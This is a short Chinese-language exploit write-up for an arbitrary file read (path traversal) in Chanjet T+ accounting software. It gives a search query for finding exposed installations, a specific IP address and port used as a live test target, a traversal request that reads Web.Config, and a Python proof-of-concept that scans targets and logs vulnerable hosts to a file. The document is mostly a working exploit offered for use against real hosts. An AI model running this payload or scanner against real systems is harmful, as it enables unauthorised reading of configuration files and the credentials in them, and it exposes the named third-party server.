## 一、资产搜索

```
app="畅捷通-TPlus"
```

## 二、网站测试

```
http://101.200.208.174:9999
```

## 三、验证漏洞

```
/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config
```

![image-20240908173509448](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908173509448.png)

## 四、POC

```
def poc(target):
    payload = "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config"
    res1 = requests.get(url=target,verify=False,timeout=5)
    if res1.status_code == 200:
        res2 = requests.get(url=target+payload,verify=False,timeout=5)
        if "configuration" in res2.text:
            with open("result.txt","a",encoding='utf-8') as f:
                f.write(f"[+]{target}\n")
                f.close()
                print(f"[+]{target}存在文件读取漏洞")
        else:
            print(f"[-]{target}不存在文件读取漏洞")
    else:
        print("访问超时，请手动测试！！！")
```

## 五、测试结果

![image-20240908173629846](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240908173629846.png)

